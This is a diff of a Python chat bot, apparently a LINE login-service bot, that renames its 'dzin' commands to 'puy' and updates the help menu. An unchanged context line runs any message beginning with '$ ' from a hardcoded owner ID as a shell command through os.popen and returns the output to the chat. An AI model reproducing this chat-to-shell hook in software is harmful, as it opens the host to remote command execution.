@@ -67,9 +67,9 @@ def RECEIVE_MESSAGE(op):
                     mystic.sendMessage(msg.to,'Heiiiii')
             if dzin.lower() == 'help':
                 if msg._from in ["uac8e3eaf1eb2a55770bf10c3b2357c33"]:
-                    sendMention(msg.to, '╭─☾ Supported by È̶͟͏RR̡͜O̵͘͟͜Ŗ͟͏͠ T̶̨̢͠҉E̶̡̛͠Á̶͡͡M̀͢͠ ☽─\n┊\n┊○ : Staff/Owner Only\n┊● : All Can Use!\n┊\n┊● dzinlogin\n┊○ +user 「filename」「mention」\n┊○ -user 「filename」 「mention」\n┊○ Usernames\n┊○ Usertimes\n┊○ respon\n┊○ Relog\n┊\n╰─☾ Contact me at @! ☽─','「 HElP MESSAGE 」', ["uac8e3eaf1eb2a55770bf10c3b2357c33"])
+                    sendMention(msg.to, '╭─☾ Supported by È̶͟͏RR̡͜O̵͘͟͜Ŗ͟͏͠ T̶̨̢͠҉E̶̡̛͠Á̶͡͡M̀͢͠ ☽─\n┊\n┊○ : Staff/Owner Only\n┊● : All Can Use!\n┊\n┊● puylogin\n┊○ +user 「filename」「mention」\n┊○ -user 「filename」 「mention」\n┊○ Usernames\n┊○ Usertimes\n┊○ respon\n┊○ Relog\n┊\n╰─☾ Contact me at @! ☽─','「 HElP MESSAGE 」', ["uac8e3eaf1eb2a55770bf10c3b2357c33"])
             if dzin.lower().startswith("$ ") and msg._from in ["uac8e3eaf1eb2a55770bf10c3b2357c33"]:q=dzin.replace("$ ","");s=os.popen(q);p=s.read();sendMention(msg.to, "「 OS SYSTEM 」\n@!\n"+p,'「 OS SYSTEM 」', [msg._from])
-            if dzin.lower() == 'dzin helpz':
+            if dzin.lower() == 'puy helpz':
                 if msg._from in wait['info']:
                     if msg._from not in ["uac8e3eaf1eb2a55770bf10c3b2357c33","ub4974c6489c969402713a974b568ee9e","uaca55463c423c3632012598148691da7"]:
                         sendMention(msg.to, '   「 È̶͟͏RR̡͜O̵͘͟͜Ŗ͟͏͠ T̶̨̢͠҉E̶̡̛͠Á̶͡͡M̀͢͠ 」\n│1.) !dzinlogin\nContact me at @!','「 HElP MESSAGE 」', ["uac8e3eaf1eb2a55770bf10c3b2357c33"])
@@ -185,7 +185,7 @@ def RECEIVE_MESSAGE(op):
                             except:pass
                     mystic.sendMessage(msg.to,'Semua Pengguna Diberhentikan.')
             if dzin.lower() == "relog" and msg._from in ["uac8e3eaf1eb2a55770bf10c3b2357c33"]:mystic.sendMessage(msg.to, 'Sukses memulai ulang.','「 BOT LOGIN 」', [msg._from]);mystic.restart_program()
-            if dzin.lower() == 'dzinlogin':
+            if dzin.lower() == 'puylogin':
                 if msg._from in wait['info'] or msg._from in ["uac8e3eaf1eb2a55770bf10c3b2357c33"]:
                     try:del wait["limit"][msg._from]
                     except:pass
